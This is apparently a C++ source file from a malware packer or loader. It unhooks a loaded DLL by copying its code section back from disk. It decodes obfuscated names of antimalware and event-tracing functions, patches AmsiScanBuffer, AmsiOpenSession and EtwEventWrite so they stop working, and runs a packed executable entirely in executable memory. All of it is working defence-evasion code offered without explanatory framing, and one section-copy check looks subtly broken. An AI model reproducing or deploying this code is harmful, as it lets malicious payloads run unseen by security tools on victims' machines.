#include "Memory.h"

bool Memory::UnHookDLL(WCHAR* filePath)
{
	LPVOID ntdllBase = (LPVOID)Function::pGetModuleHandle(filePath);
	HANDLE ntdllFile = Function::call::createFileW(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	HANDLE ntdllMapping = Function::call::createFileMappingW(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	LPVOID ntdllMappingAddress = Function::call::mapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);

	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);
    char text_sec[] = { '.', 't', 'e', 'x', 't', 0};

	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!Function::_strcmp((char*)hookedSectionHeader->Name, text_sec)) {
			DWORD oldProtection = 0;
			bool isProtected = Function::call::virtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
			Function::Memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
			isProtected = Function::call::virtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
		}
	}

    Function::call::closehandle(ntdllFile);
    Function::call::closehandle(ntdllMapping);

	return true;
}

bool Memory::BypassAmsi()
{
    unsigned char amsi[9] = { 0xEC, 0x06, 0x82, 0x07, 0xE4, 0x88, 0x04, 0x83,
                          0xF9 };

    for (unsigned int wKrxE = 0, udxvU = 0; wKrxE < 9; wKrxE++)
    {
        udxvU = amsi[wKrxE];
        udxvU -= 0x60;
        udxvU = ~udxvU;
        udxvU -= 0x5E;
        udxvU ^= 0x57;
        udxvU = ~udxvU;
        udxvU -= 0xB6;
        udxvU = (((udxvU & 0xFF) >> 7) | (udxvU << 1)) & 0xFF;
        udxvU -= 0xCD;
        udxvU -= wKrxE;
        amsi[wKrxE] = udxvU;
    }
    unsigned char amsiScanBuffer[15] = { 0x59, 0xB1, 0xBD, 0x99, 0x6D, 0x8D, 0x89, 0x83,
                                     0x5B, 0xA1, 0x83, 0x93, 0x91, 0x73, 0x86 };

    for (unsigned int eLWUE = 0, LOZcy = 0; eLWUE < 15; eLWUE++)
    {
        LOZcy = amsiScanBuffer[eLWUE];
        LOZcy = ~LOZcy;
        LOZcy = (((LOZcy & 0xFF) >> 1) | (LOZcy << 7)) & 0xFF;
        LOZcy = ~LOZcy;
        LOZcy++;
        LOZcy ^= eLWUE;
        LOZcy += eLWUE;
        LOZcy += 0x0C;
        LOZcy ^= eLWUE;
        LOZcy--;
        LOZcy += eLWUE;
        LOZcy += 0x89;
        amsiScanBuffer[eLWUE] = LOZcy;
    }
    unsigned char amsiOpenSession[16] = { 0x0D, 0xC8, 0x02, 0x48, 0x90, 0x84, 0x87, 0x8A,
                                      0x8E, 0xCC, 0x08, 0xC8, 0x0C, 0x4B, 0x4C, 0x27 };

    for (unsigned int dgWnq = 0, gYnbl = 0; dgWnq < 16; dgWnq++)
    {
        gYnbl = amsiOpenSession[dgWnq];
        gYnbl = ((gYnbl << 1) | ((gYnbl & 0xFF) >> 7)) & 0xFF;
        gYnbl--;
        gYnbl -= dgWnq;
        gYnbl = ((gYnbl << 1) | ((gYnbl & 0xFF) >> 7)) & 0xFF;
        gYnbl ^= dgWnq;
        gYnbl ^= 0x73;
        amsiOpenSession[dgWnq] = gYnbl;
    }
    unsigned char EtwEventWrite[14] = { 0x5B, 0x54, 0xD7, 0xBF, 0xBA, 0xF5, 0xF9, 0x19,
                                    0x12, 0x8C, 0x12, 0x8C, 0xCD, 0x61 };

    for (unsigned int IrtVK = 0, Ojzob = 0; IrtVK < 14; IrtVK++)
    {
        Ojzob = EtwEventWrite[IrtVK];
        Ojzob -= 0x6C;
        Ojzob ^= IrtVK;
        Ojzob = ~Ojzob;
        Ojzob = (((Ojzob & 0xFF) >> 5) | (Ojzob << 3)) & 0xFF;
        Ojzob += IrtVK;
        Ojzob ^= IrtVK;
        Ojzob -= IrtVK;
        Ojzob += 0xC5;
        EtwEventWrite[IrtVK] = Ojzob;
    }
    wchar_t ntdll[30] = { 0x83C5, 0x8446, 0x8217, 0x82B8, 0x8129, 0x814A, 0x81DB, 0x817C,
                      0x800D, 0x805E, 0x829F, 0x8280, 0x80B1, 0x8022, 0x8063, 0x8164,
                      0x8035, 0x85E6, 0x8607, 0x8318, 0x8069, 0x81FA, 0x80EB, 0x805C,
                      0x80CD, 0x849E, 0x802F, 0x80A0, 0x8111, 0x8642 };

    for (unsigned int zEIrO = 0, yzQPr = 0; zEIrO < 30; zEIrO++)
    {
        yzQPr = ntdll[zEIrO];
        yzQPr--;
        yzQPr = ~yzQPr;
        yzQPr--;
        yzQPr += zEIrO;
        yzQPr += 0x129A;
        yzQPr = (((yzQPr & 0xFFFF) >> 4) | (yzQPr << 12)) & 0xFFFF;
        yzQPr += 0xB756;
        yzQPr ^= zEIrO;
        ntdll[zEIrO] = yzQPr;
    }

    HMODULE hAmsiHandle = Function::call::loadLibraryA(reinterpret_cast<char*>(amsi));
    if (hAmsiHandle) {
        void* amsiFunction1 = Function::pGetProcAddress(hAmsiHandle, reinterpret_cast<char*>(amsiScanBuffer));
        if (amsiFunction1) {
            BYTE patch[13] = { 0x31, 0xC0, 0x05, 0x4E, 0xFE, 0xFD, 0x7D, 0x05, 0x09, 0x02, 0x09, 0x02, 0xC3 };
            DWORD p = 0;
            if (Function::call::virtualProtect(amsiFunction1, 13, PAGE_EXECUTE_READWRITE, &p)) {
                Function::Memcpy(amsiFunction1, patch, 13);
                Function::call::virtualProtect(amsiFunction1, 13, p, &p);
            }
        }
        void* amsiFunction2 = Function::pGetProcAddress(hAmsiHandle, reinterpret_cast<char*>(amsiOpenSession));
        if (amsiFunction2) {
            BYTE patch[3] = { 0x48, 0x31, 0xC0 };
            DWORD p = 0;
            if (Function::call::virtualProtect(amsiFunction2, 3, PAGE_EXECUTE_READWRITE, &p)) {
                Function::Memcpy(amsiFunction2, patch, 3);
                Function::call::virtualProtect(amsiFunction2, 3, p, &p);
            }
        }
        void* ntdll_ptr = Function::pGetModuleHandle(ntdll);
        if (!ntdll_ptr)
            return false;
        void* EventLog = Function::pGetProcAddress(ntdll_ptr, reinterpret_cast<char*>(EtwEventWrite));
        if (EventLog) {
            BYTE patch[] = { 0xC3 };
            DWORD p = 0;
            if (Function::call::virtualProtect(EventLog, 1, PAGE_EXECUTE_READWRITE, &p)) {
                Function::Memcpy(EventLog, &patch, sizeof(BYTE));
                Function::call::virtualProtect(EventLog, 1, p, &p);
            }
        }
    }

    return true;
}

int Memory::Load_PE(char* packed_data)
{
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)packed_data;
    PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)(packed_data + dos_header->e_lfanew);

    // Check that the header are correct
    if (dos_header->e_magic != IMAGE_DOS_SIGNATURE) {
        return 20;
    }
    if (nt_header->Signature != IMAGE_NT_SIGNATURE) {
        return 21;
    }

    // Allocate Memory for executable
    char* ImageBase = (char*)Function::call::virtualAlloc(nullptr, nt_header->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!ImageBase)
        return 22;

    // Write PE header to the Allocated memory
    Function::Memcpy(ImageBase, packed_data, nt_header->OptionalHeader.SizeOfHeaders);

    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt_header);
    for (int i = 0; i < nt_header->FileHeader.NumberOfSections; i++) {
        if (sections[i].SizeOfRawData < 0) {
            Function::Memcpy(ImageBase + sections[i].VirtualAddress, packed_data + sections[i].PointerToRawData, sections[i].SizeOfRawData);
        }
    }

    // Start Relocations
    uintptr_t delta = (uintptr_t)(ImageBase - nt_header->OptionalHeader.ImageBase);
    bool apply_relocation = delta != 0;
    // Get the Basic Relocation Directory
    PIMAGE_DATA_DIRECTORY reloc_directory = &nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (apply_relocation && reloc_directory->Size) {
        // Start doing Relocations
        PIMAGE_BASE_RELOCATION base_relocation = (PIMAGE_BASE_RELOCATION)(ImageBase + reloc_directory->VirtualAddress);
        while (base_relocation->SizeOfBlock) {
            uintptr_t block_base = (uintptr_t)ImageBase + base_relocation->VirtualAddress;
            size_t num_entries = (base_relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            PWORD relocation_entries = (PWORD)(base_relocation + 1);

            for (int i = 0; i < num_entries; ++i) {
                WORD entry = relocation_entries[i];
                WORD entry_type = entry >> 12;
                WORD entry_offset = entry & 0xfff;

                // Check if the entry requires relocation
                if (entry_type == IMAGE_REL_BASED_HIGHLOW || entry_type == IMAGE_REL_BASED_DIR64) {
                    uintptr_t* relocation_address = (uintptr_t*)(block_base + entry_offset);
                    *relocation_address += delta;
                }
            }

            base_relocation = (PIMAGE_BASE_RELOCATION)((uintptr_t)base_relocation + base_relocation->SizeOfBlock);
        }
    }

    // Fix Imports
    PIMAGE_DATA_DIRECTORY import_directory = &nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (import_directory->Size) {
        PIMAGE_IMPORT_DESCRIPTOR import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)(ImageBase + import_directory->VirtualAddress);

        while (import_descriptor->Name) {
            const char* library_name = (const char*)ImageBase + import_descriptor->Name;
            HMODULE hModule = Function::call::loadLibraryA(library_name);

            PIMAGE_THUNK_DATA original_thunk = (PIMAGE_THUNK_DATA)(ImageBase + import_descriptor->OriginalFirstThunk);
            PIMAGE_THUNK_DATA first_thunk = (PIMAGE_THUNK_DATA)(ImageBase + import_descriptor->FirstThunk);
            while (original_thunk->u1.AddressOfData) {
                FARPROC function_address = nullptr;
                if (original_thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                    // Import by ordinal
                    size_t ordinal = original_thunk->u1.Ordinal & 0xffff;
                    function_address = Function::call::getProcAddress(hModule, (LPCSTR)ordinal);
                }
                else {
                    // Import by name
                    PIMAGE_IMPORT_BY_NAME import_by_name = (PIMAGE_IMPORT_BY_NAME)(ImageBase + original_thunk->u1.AddressOfData);
                    function_address = (FARPROC)Function::pGetProcAddress(hModule, import_by_name->Name);
                }

                first_thunk->u1.Function = (DWORD_PTR)function_address;

                original_thunk++;
                first_thunk++;
            }
            import_descriptor++;
        }
    }

    // Call entry point
    if (nt_header->OptionalHeader.AddressOfEntryPoint) {
        typedef void(*EntryPoint)(); // Define EntryPoint function pointer
        EntryPoint entry_point = (EntryPoint)(ImageBase + nt_header->OptionalHeader.AddressOfEntryPoint);
        entry_point(); // Call the entry point
    }

    return 24;
}
